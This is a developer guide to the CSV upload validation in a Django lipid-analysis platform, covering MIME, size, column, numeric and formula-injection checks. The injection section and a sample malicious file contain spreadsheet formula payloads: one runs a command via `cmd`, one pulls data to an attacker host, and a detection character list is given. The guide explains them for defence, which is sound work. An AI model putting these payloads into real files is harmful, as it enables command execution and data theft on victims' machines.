# CSV File Upload Validation Guide

## Overview

The Django Ganglioside Analysis Platform includes comprehensive file upload validation to ensure data integrity, security, and correctness. This document describes the validation system, its capabilities, and how to use it.

## Validation Features

The validation system performs **five critical checks** on all uploaded CSV files:

### 1. MIME Type Check
**Purpose**: Ensure the file is actually a CSV file

**Accepted MIME Types**:
- `text/csv` - Standard CSV format
- `text/plain` - Plain text (often CSV)
- `application/csv` - CSV application type
- `application/vnd.ms-excel` - Excel-exported CSV

**Error Handling**: Rejects files that don't match accepted types

```
Example Error: "Invalid MIME type: application/pdf. Expected CSV file..."
```

### 2. File Size Limit
**Purpose**: Prevent resource exhaustion from oversized uploads

**Limit**: 50 MB (52,428,800 bytes)

**Error Handling**:
- Rejects files larger than 50MB
- Rejects empty files (0 bytes)

```
Example Error: "File size (150.5MB) exceeds maximum allowed size (50.0MB)."
Example Error: "File is empty. Please upload a non-empty CSV file."
```

### 3. CSV Injection Detection
**Purpose**: Detect and prevent formula injection attacks

**Dangerous Patterns Detected**:
- Cells starting with `=` → Excel/spreadsheet formulas
- Cells starting with `+` → Alternative formula syntax
- Cells starting with `-` → Alternative formula syntax
- Cells starting with `@` → XL Macro Language (XLM) commands

**Why This Matters**:
Attackers can embed formulas in CSV files that execute when opened in spreadsheet applications:
- `=cmd|'/c calc'` → Launches calculator
- `=IMPORT("http://attacker.com/data")` → Exfiltrates data
- `@SUM(sensitive_data)` → XLM macro execution

**Error Handling**: Rejects files containing injection patterns with row numbers

```
Example Error: "Row 2: Column 'Name': Potential CSV injection detected..."
```

### 4. Required Columns Check
**Purpose**: Ensure all necessary data columns are present

**Required Columns**:
1. `Name` - Compound identifier (format: PREFIX(a:b;c))
2. `RT` - Retention time (minutes, float)
3. `Volume` - Peak volume/area (float)
4. `Log P` - Lipophilicity (float)
5. `Anchor` - Training flag ("T" for anchor, "F" for test)

**Error Handling**: Identifies and reports missing columns

```
Example Error: "Missing required columns: Log P, Volume. Expected columns: Anchor, Log P, Name, RT, Volume"
```

### 5. Data Type Validation
**Purpose**: Ensure numeric fields contain valid numbers

**Numeric Columns Validated**:
- `RT` - Must be float (e.g., 9.572)
- `Volume` - Must be float (e.g., 1000000 or 1e6)
- `Log P` - Must be float, can be negative (e.g., -0.94)

**Anchor Field Validation**:
- Warns if anchor value is not "T", "F", "TRUE", or "FALSE"
- Common variations accepted: T/F, TRUE/FALSE

**Error Handling**: Reports invalid data with row and column information

```
Example Error: "Row 3: Column 'RT': Invalid numeric value 'abc'. Expected a number."
Example Error: "Row 5: Column 'Anchor': Required field is empty."
```

## Valid CSV Format Example

```csv
Name,RT,Volume,Log P,Anchor
GD1(36:1;O2),9.572,1000000,1.53,T
GM1(36:1;O2),10.452,500000,4.00,F
GT1(36:1;O2),8.701,1200000,-0.94,T
GM3(18:1;O2),10.606,2000000,7.74,F
GD3(36:1;O2),10.126,800000,5.27,T
```

## Implementation Details

### Location
- **Validation Module**: `/apps/analysis/utils.py`
- **Integration Point**: `/apps/analysis/serializers.py` (AnalysisSessionCreateSerializer)
- **Tests**: `/apps/analysis/tests/test_csv_validation.py`

### Core Function: `validate_csv_file()`

```python
from apps.analysis.utils import validate_csv_file

# Upload a file via Django's request.FILES
uploaded_file = request.FILES['file']

# Validate the file
validation_result = validate_csv_file(uploaded_file)

# Check results
if validation_result['is_valid']:
    print("File is valid!")
    print(f"Rows: {validation_result['metadata']['row_count']}")
else:
    print("Validation errors:")
    for error in validation_result['errors']:
        print(f"  - {error}")

    # Warnings (non-blocking)
    for warning in validation_result['warnings']:
        print(f"  ⚠ {warning}")
```

### Return Value Structure

```python
{
    'is_valid': bool,           # True if file passes all validations
    'errors': List[str],        # Critical validation errors
    'warnings': List[str],      # Non-blocking warnings
    'metadata': {
        'mime_type': str,       # Detected MIME type
        'file_size': int,       # Size in bytes
        'file_size_mb': float,  # Size in megabytes
        'headers': List[str],   # CSV column names
        'row_count': int,       # Number of data rows
        'data_quality': {       # Additional quality metrics
            'total_rows': int,
            'rows_with_issues': List[Dict]
        }
    }
}
```

## Integration with Django REST Framework

The validation is automatically applied in the serializer's `validate_uploaded_file()` method:

```python
class AnalysisSessionCreateSerializer(serializers.ModelSerializer):
    uploaded_file = serializers.FileField()

    def validate_uploaded_file(self, value):
        """Validate using comprehensive validation function"""
        validation_result = validate_csv_file(value)

        if not validation_result['is_valid']:
            # Raise DRF ValidationError with details
            raise serializers.ValidationError(
                "File validation failed:\n" +
                "\n".join(f"- {err}" for err in validation_result['errors'])
            )

        return value
```

## API Usage Examples

### Example 1: Successful Upload

**Request**:
```bash
curl -X POST http://localhost/api/analysis/sessions/ \
  -H "Authorization: Bearer <token>" \
  -F "name=My Analysis" \
  -F "data_type=real" \
  -F "uploaded_file=@valid_data.csv"
```

**Response**:
```json
{
  "id": 1,
  "name": "My Analysis",
  "status": "pending",
  "original_filename": "valid_data.csv",
  "file_size": 12345,
  "created_at": "2025-11-18T10:00:00Z"
}
```

### Example 2: Validation Error (Missing Column)

**Request**:
```bash
curl -X POST http://localhost/api/analysis/sessions/ \
  -H "Authorization: Bearer <token>" \
  -F "uploaded_file=@incomplete_data.csv"
```

**Response** (400 Bad Request):
```json
{
  "uploaded_file": [
    "File validation failed:\n- Missing required columns: Log P, Volume"
  ]
}
```

### Example 3: CSV Injection Detection

**Request** (with malicious CSV):
```bash
curl -X POST http://localhost/api/analysis/sessions/ \
  -F "uploaded_file=@injection.csv"
```

File content:
```csv
Name,RT,Volume,Log P,Anchor
=cmd|'/c calc',9.572,1000000,1.53,T
```

**Response** (400 Bad Request):
```json
{
  "uploaded_file": [
    "File validation failed:\n- Row 2: Column 'Name': Potential CSV injection detected (cells cannot start with =, +, -, @)"
  ]
}
```

## Security Considerations

### What This Validates

✅ **Protected Against**:
- CSV injection/formula injection attacks
- Oversized file uploads (DoS protection)
- Missing critical data columns
- Invalid data types in numeric fields
- Empty files
- Non-CSV files disguised as CSV

### What This Doesn't Protect Against

❌ **Not Covered**:
- SQL injection (handled by ORM)
- Path traversal (handled by Django FileField)
- CSRF attacks (handled by Django CSRF middleware)
- Authentication/authorization (handled by DRF permissions)
- Malicious data within valid CSV (application-level logic)

### Best Practices

1. **Always validate on the server** - Never trust client-side validation
2. **Use in combination with other security measures**:
   - CSRF protection (Django middleware)
   - Authentication (DRF permissions)
   - Authorization (user ownership checks)
   - Rate limiting (django-ratelimit)
3. **Log validation failures** - Monitor for attack attempts
4. **Educate users** - Explain file requirements clearly

## Testing

### Running Validation Tests

```bash
# Run all validation tests
docker-compose exec django pytest apps/analysis/tests/test_csv_validation.py -v

# Run specific test
docker-compose exec django pytest apps/analysis/tests/test_csv_validation.py::CSVValidationTestCase::test_validate_csv_injection_detection -v

# Run with coverage
docker-compose exec django pytest apps/analysis/tests/test_csv_validation.py --cov=apps.analysis.utils
```

### Test Coverage

The test suite includes:
- ✅ Valid CSV files
- ✅ Missing required columns
- ✅ CSV injection attempts (=, +, -, @)
- ✅ Invalid numeric data
- ✅ Empty required fields
- ✅ Invalid anchor values
- ✅ MIME type validation
- ✅ File size validation
- ✅ Edge cases (unicode, scientific notation, long names)

## Troubleshooting

### "Invalid MIME type" Error

**Cause**: File extension doesn't match expected type

**Solution**:
- Save file as `.csv` (not `.xlsx`, `.txt`, etc.)
- Check file with: `file -b --mime-type your_file.csv`

### "Missing required columns" Error

**Cause**: One or more required columns is missing

**Solution**:
- Ensure your CSV has exactly these columns: Name, RT, Volume, Log P, Anchor
- Check for typos in column names (case-sensitive)
- Use the exact column order if possible

### "CSV injection detected" Error

**Cause**: A cell value starts with =, +, -, or @

**Solution**:
- This is intentional security protection
- If you have legitimate data starting with these characters:
  - In Excel: Prefix with a single quote (') → Excel hides it but data is preserved
  - Your CSV becomes: `'=value` instead of `=value`

### "File size exceeds maximum" Error

**Cause**: File is larger than 50MB

**Solution**:
- Split large datasets into multiple files
- Remove unnecessary columns
- Contact administrator if you need larger limit

### "Invalid numeric value" Error

**Cause**: RT, Volume, or Log P contains non-numeric data

**Solution**:
- Check for text characters mixed with numbers
- Use standard decimal notation (e.g., `1.53`, not `1,53`)
- Scientific notation works: `1e6` = 1,000,000

## Configuration

### Adjusting Validation Parameters

Edit `apps/analysis/utils.py` to change limits:

```python
# Maximum file size (currently 50MB)
MAX_FILE_SIZE = 50 * 1024 * 1024

# Required columns (must match your data format)
REQUIRED_COLUMNS = {'Name', 'RT', 'Volume', 'Log P', 'Anchor'}

# Numeric columns to validate
NUMERIC_COLUMNS = {'RT', 'Volume', 'Log P'}

# Injection detection characters
CSV_INJECTION_CHARS = {'=', '+', '-', '@'}
```

After changes, restart the Django application:

```bash
docker-compose restart django
```

## Future Enhancements

Potential improvements planned:

- [ ] Support for custom column mappings
- [ ] Batch import with partial success
- [ ] CSV preview before final upload
- [ ] Data transformation/cleaning options
- [ ] Support for compressed files (.zip, .gzip)
- [ ] Database-backed upload history
- [ ] Real-time validation progress feedback

## Support

For issues with file validation:

1. Check this guide first
2. Review test cases in `test_csv_validation.py`
3. Check Django logs: `docker-compose logs django`
4. Validate your CSV with standard tools:
   ```bash
   csvstat your_file.csv
   head -5 your_file.csv
   ```

## Summary

| Validation | Type | Limit | Impact |
|-----------|------|-------|--------|
| MIME Type | Security | text/csv, text/plain, application/csv | Blocks non-CSV files |
| File Size | Resource | 50 MB | Blocks oversized uploads |
| CSV Injection | Security | No =, +, -, @ at cell start | Blocks formula injection |
| Required Columns | Data Quality | Name, RT, Volume, Log P, Anchor | Blocks incomplete data |
| Data Types | Data Quality | RT, Volume, Log P must be numeric | Blocks invalid numbers |
| Anchor Values | Data Quality | T, F, TRUE, FALSE | Warns on non-standard values |
